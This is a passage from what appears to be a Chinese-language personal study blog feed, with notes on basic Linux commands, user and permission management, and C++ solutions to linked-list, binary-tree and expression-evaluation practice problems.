[-d] [+格式化字符串]<br></code></pre></td></tr></table></figure><ul><li><p><code>-d</code> 按照给定的字符串显示日期，一般用于日期的计算</p></li><li><p>格式化字符串</p><p>通过特定的字符串标记，用来控制显示 的日期</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%97%A5%E6%9C%9F.png"></p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\linux\使用linux.assets\image-20230501234712440.png"></p></li></ul></li></ol><h2 id="IP地址、主机名"><a href="#IP地址、主机名" class="headerlink" title="IP地址、主机名"></a>IP地址、主机名</h2><ol><li><p>IP和主机名</p><p><code>ip</code>使用<code>ifconfig</code></p><p>主机名 <code>hostname</code></p></li><li><p>域名解析</p><p>通过主机名找到对应的IP  </p></li><li><p>设置固定<code>IP</code></p></li></ol><h2 id="网络传输"><a href="#网络传输" class="headerlink" title="网络传输"></a>网络传输</h2><ol><li><p><code>ping</code></p><p>检查是否可以来连通</p><p><code>ping [-c num]</code> op或者主机名</p><p><code>-c</code>用于检查次数，不然会无限检查</p></li><li><p><code>wget</code></p><p>下载网络文件</p><p><code>wget [ -b ] url</code> </p><p>b是后台下载</p></li><li><p><code>curl +IP/域名</code></p><p>发起网络请求</p><ul><li><p>使用<code>curl cip.cc</code></p><p>查看当前主机的ip</p></li><li><p>使用选项<code>-O</code>下载</p></li></ul></li></ol><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><ol><li><p>IP只能代表某一个具体的电脑，不能锁定程序</p></li><li><p>总共有<code>65535</code>个端口</p></li><li><p>公认端口<code>1~1023</code></p></li><li><p>注册端口<code>1024~49151</code>，随意使用</p></li><li><p>动态端口<code>49152,65535</code>，不会绑定程序，而是当程序对外网连接时，用于临时用</p></li><li><p><code>nmap</code>查看端口的占用情况</p><p><code>nmap + IP</code>查看哪些端口是对外链接的 </p></li><li><p><code>netstat</code>查看端口的占用情况</p><p><code>netstat -anp | grep 端口号</code></p><p>查看端口的占用情况</p></li><li><p><code>ss</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo ss -tlnp</span><br></code></pre></td></tr></table></figure><p>该命令与 netstat 的作用相同，也是显示当前正在监听的 TCP 端口和与之关联的进程信息，其中：</p><ul><li><code>-t</code> 参数表示只显示 TCP 协议相关的信息；</li><li><code>-l</code> 参数表示只显示正在监听的端口；</li><li><code>-n</code> 参数表示以数字形式显示端口号，而不是服务名称；</li><li><code>-p</code> 参数表示同时显示进程 ID 和进程名。</li></ul></li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ol><li><p>查看进程</p><p><code>ps [-e -f]</code></p><p><code>-e</code>展现全部信息</p><p><code>-f</code>以格式化的方式是展示</p></li><li><p>关闭进程</p><p><code>kill [-9] 进程ID</code></p><p><code>-9</code>表示强制关闭</p></li></ol><h2 id="主机状态"><a href="#主机状态" class="headerlink" title="主机状态"></a>主机状态</h2><h3 id="查看系统资源"><a href="#查看系统资源" class="headerlink" title="查看系统资源"></a>查看系统资源</h3><ol><li><p><code>top</code></p><p>查看<code>cpu</code>的使用情况</p></li><li><p><code>df</code>查看磁盘使用情况</p></li><li><p><code>iostat</code></p><p>查看cpu,磁盘信息  </p><p>使用<code>-x</code>显示更多的信息</p></li><li><p><code>sar -n DEV num1 num2</code></p><p><code>-n</code>查看网络</p><p><code>DEV</code>查看网络接口</p><p><code>num1</code> 刷新间隔</p><p><code>num2</code>查看次数</p></li></ol><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><ol><li><p>查看环境变量</p><p><code>env</code></p></li><li><p>临时设置环境变量</p><p><code>export 变量名=变量值</code></p></li><li><p>永久有效</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E9%85%8D%E7%BD%AE.png"></p><ul><li>针对用户</li><li>全局有效</li><li>使用<code>source </code>让其有效</li></ul></li></ol><h2 id="解压和压缩"><a href="#解压和压缩" class="headerlink" title="解压和压缩"></a>解压和压缩</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>针对<code>.tar</code>和<code>.gz</code>的压缩文件</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar.png"></p><ul><li><p>压缩</p><p><code>tar -cvf test.tar 1.txt</code>将<code>1.txt</code>文件压缩到<code>test.tar</code>文件</p><p><code>tar -zcvf test.tar.gz 1.txt</code>将<code>1.txt</code>压缩到<code>test.tar.gz</code>文件内，使用<code>gzip</code>的模式</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar%E5%8E%8B%E7%BC%A9.png"></p></li><li><p>解压</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/tar%E8%A7%A3%E5%8E%8B.png"></p></li></ul><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><ul><li><p>压缩</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/zip%E7%9A%84%E5%8E%8B%E7%BC%A9.png"></p></li><li><p>解压</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/unzip%E8%A7%A3%E5%8E%8B.png"></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表中的节点每k个一组翻转</title>
    <link href="/2023/04/26/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC/"/>
    <url>/2023/04/26/%E7%AE%97%E6%B3%95/newcoder/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/b49c3dc907814e9bbfa8437c251b028e?tpId=295&tqId=722&ru=/exam/intelligent&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/intelligent?questionJobId=10&tagId=21000">链表中的节点每k个一组翻转_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9%E6%AF%8Fk%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param k int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseKGroup</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <span class="hljs-keyword">auto</span> headTem = <span class="hljs-keyword">new</span> ListNode&#123;<span class="hljs-number">0</span>&#125;;<br>        headTem-&gt;next = head;<br><br>        std::vector&lt;ListNode*&gt; vector;<br>        <span class="hljs-keyword">auto</span> moveNode = head;<br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">nullptr</span>) &#123;<br>            vector.<span class="hljs-built_in">push_back</span>(moveNode);<br>            moveNode = moveNode-&gt;next;<br>            i++;<br>            vector.<span class="hljs-built_in">back</span>()-&gt;next = <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">if</span> (i % k == <span class="hljs-number">0</span>) &#123;<br>                std::<span class="hljs-built_in">reverse</span>(vector.<span class="hljs-built_in">begin</span>() + i - k, vector.<span class="hljs-built_in">begin</span>() + i );<br>            &#125;<br><br>        &#125;<br>        moveNode = headTem;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : vector) &#123;<br>            moveNode-&gt;next = item;<br>            moveNode = item;<br>        &#125;<br>        <span class="hljs-keyword">return</span> headTem-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>使用<code>reverse</code>函数对<code>vector</code>进行翻转</li></ul></li><li><p>理解</p><p>- </p></li><li><p>问题</p><ul><li><p>为什么要使用<code>vector</code></p><blockquote><p>因为使用链表的操作太过于复杂</p></blockquote></li><li><p>33行是为什么？</p><blockquote><p>使得调试的时候方便看结点，这样就只会显示一个节点</p></blockquote></li></ul></li><li><p>注意</p><ul><li><p>迭代器的用法，特别是begin()，和end()</p></li><li><p><code>reverse(迭代器1，迭代器2)</code>函数的用法</p><blockquote><p>将2之前的反转，并不会包括2</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用户和权限</title>
    <link href="/2023/04/26/linux/%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90/"/>
    <url>/2023/04/26/linux/%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="用户和权限"><a href="#用户和权限" class="headerlink" title="用户和权限"></a>用户和权限</h1><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><ol><li><p><code>su</code></p><p>切换用户</p><ul><li><p><code>su - -root</code></p><p>注意中间的<code>-</code> 前后都有空格</p></li></ul></li><li><p><code>exit</code></p><p>退出返回上一个用户</p></li><li><p><code>sudo</code></p><p>普通用户获得普通的权限，但不是所有的用户都有<code>sudo</code>认证，需要认证</p></li></ol><h2 id="用户用户组"><a href="#用户用户组" class="headerlink" title="用户用户组"></a>用户用户组</h2><ol><li>一个用户可以在多个用户组</li></ol><h3 id="用户组的管理"><a href="#用户组的管理" class="headerlink" title="用户组的管理"></a>用户组的管理</h3><ol><li><p>用户组的创建</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">groupadd` 用户组名<br></code></pre></td></tr></table></figure></li><li><p>删除用户组</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">groupdel</span> 用户组名<br></code></pre></td></tr></table></figure></li></ol><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86.png"></p><ul><li><p><code>getent passwd</code></p><p>查看当前系统中有哪些用户</p></li></ul><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%83%E9%99%90.png"></p><ol><li><p><code>chmod</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> -R 权限 文件或者文件夹<br></code></pre></td></tr></table></figure><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/chmod.png"></p><p>使用<code>-R</code>代表将文件夹里面的也一并修改</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">751</span> 文件或者文件夹<br></code></pre></td></tr></table></figure><ul><li>7代表给用户的</li><li>5代表给用户组的权利</li><li>1代表给其他的权利</li></ul><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/%E6%95%B0%E5%AD%97%E6%9D%83%E9%99%90.png"></p></li><li><p><code>chown</code>修改所属的用户、用户组</p><p>该命令只针对于<code>root</code>用户</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E7%94%A8%E6%88%B7/chown.png"></p><ul><li><p>只修改用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown <span class="hljs-keyword">user</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li><li><p>只修改用户组</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown :<span class="hljs-keyword">group</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li><li><p>两个都修改</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">chown user:<span class="hljs-keyword">group</span> <span class="hljs-title">test</span>.txt<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从中序与后序遍历序列构造二叉树</title>
    <link href="/2023/04/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/04/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/ab8dde7f01f3440fbbb7993d2411a46b?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">从中序与后序遍历序列构造二叉树_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct TreeNode *left;</span><br><span class="hljs-comment"> *  struct TreeNode *right;</span><br><span class="hljs-comment"> *  TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-type">int</span> indexMap;<span class="hljs-comment">//根节点的在后序遍历的下标</span><br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; unorderedMap;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param inorder int整型vector 中序遍历序列</span><br><span class="hljs-comment">     * @param postorder int整型vector 后序遍历序列</span><br><span class="hljs-comment">     * @return TreeNode类</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-function">TreeNode *<span class="hljs-title">build</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;inorder, vector&lt;<span class="hljs-type">int</span>&gt; &amp;postorder, <span class="hljs-type">int</span> leftSub, <span class="hljs-type">int</span> rightSub)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (leftSub &gt; rightSub) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-keyword">auto</span> root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(postorder[indexMap]);<br>        <span class="hljs-keyword">auto</span> index = unorderedMap[postorder[indexMap]];<br>        indexMap--;<br>        root-&gt;right = <span class="hljs-built_in">build</span>(inorder, postorder, index + <span class="hljs-number">1</span>, rightSub);<br>        root-&gt;left = <span class="hljs-built_in">build</span>(inorder, postorder, leftSub, index - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        indexMap = postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : inorder) &#123;<br>            unorderedMap[item] = sub++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(inorder, postorder, <span class="hljs-number">0</span>, inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p>后序遍历的最后一个元素是<code>root</code>的<code>val</code></p></li><li><p>采取递归的方法，创建结点</p></li><li><p>注意创建的顺序，应该是先是右的再左的</p><p>因为创建的顺序应该是是从最小树开始创建</p></li></ul></li><li><p>理解</p><ul><li><pre><code class="c++">        for (const auto&amp; item : inorder) &#123;            unorderedMap[item] = sub++;        &#125;</code></pre><p>将&lt;元素，下标&gt;的方式存放数据</p><p>这样操作的原因是：方便的通过后序遍历找到<code>root</code>，再通过<code>map</code>查找数据</p></li><li><p>把每一个都当成一个<code>root</code></p></li></ul></li><li><p>问题</p><ul><li><p><code>leftSub &gt; rightSub</code></p><blockquote><p>当左节点的下标大于右节点的下标就表示这棵树是NULL</p><p>也就是说子串是无的</p></blockquote></li><li><p>为什么要先创建右节点</p><blockquote><p>因为我们的后序遍历顺序是:左-右-根</p><p>所以当我们把<code>root</code>取出剩下的应该就是右节点</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>表达式求值</title>
    <link href="/2023/04/21/%E7%AE%97%E6%B3%95/newcoder/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/"/>
    <url>/2023/04/21/%E7%AE%97%E6%B3%95/newcoder/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/c215ba61c8b1443b996351df929dc4d4?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">表达式求值_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     * 返回表达式的值</span><br><span class="hljs-comment">     * @param s string字符串 待计算的表达式</span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">func</span><span class="hljs-params">(string str,<span class="hljs-type">int</span> sub)</span></span>&#123;<br>        <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> op=<span class="hljs-string">&#x27;+&#x27;</span>;<span class="hljs-comment">//默认前面的数是+</span><br>        <span class="hljs-type">int</span> i=sub;<span class="hljs-comment">//设置值下表，用于递归</span><br>        <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//和</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; vector;<span class="hljs-comment">//通过vector,返回sum，和下标</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<span class="hljs-comment">//栈区存放数字</span><br>        <span class="hljs-keyword">for</span>(;i&lt;str.<span class="hljs-built_in">size</span>();++i) &#123;<br>            <span class="hljs-comment">//下面的是，用于计算数字比如100,这样的多位数字</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(str[i])) &#123;<br>                num = num * <span class="hljs-number">10</span> + str[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                <span class="hljs-keyword">if</span> (i != str.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br>            <br>            <span class="hljs-comment">//递归标志</span><br>            <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>                vector = <span class="hljs-built_in">func</span>(str, ++i);<br>                <span class="hljs-comment">//vector[0]，用于存放sum</span><br>                <span class="hljs-comment">//vector[1],用于存放下标</span><br>                num=vector[<span class="hljs-number">0</span>];<br>                i=vector[<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(i!=str.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>)&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">switch</span> (op) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                    stack.<span class="hljs-built_in">push</span>(num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    stack.<span class="hljs-built_in">push</span>(-num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                    num *= stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(num);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            num=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//递归结束的标志</span><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                op=str[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//下面是求和的过程</span><br>        <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>            sum+=stack.<span class="hljs-built_in">top</span>();<br>            stack.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> ::vector&lt;<span class="hljs-type">int</span>&gt;&#123;sum,i&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">solve</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here     </span><br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">func</span>(s,<span class="hljs-number">0</span>).<span class="hljs-built_in">front</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%B1%82%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC.gif"></p><p>采取栈加递归的方式</p><p>如果是数字，根据前面的符号放进入栈区，如果是’+’，则直接放进去，如果是’-‘，就放入相反数，如果是’*’，就从栈区取出一个元素，然后计算。</p><p>如果遇到<code>(</code>，当作递归的标志，进行递归（注意要设置下标）。</p><p>如果像<code>100</code>，这样的多位数字，就应该进行数字的录入</p></li><li><p>理解</p><ul><li>采用<code>func()</code>,简化运算，方便调用</li><li>使用<code>vector</code>，可以采用返回两个元素（sum，下标）</li></ul></li><li><p>问题</p><p>- 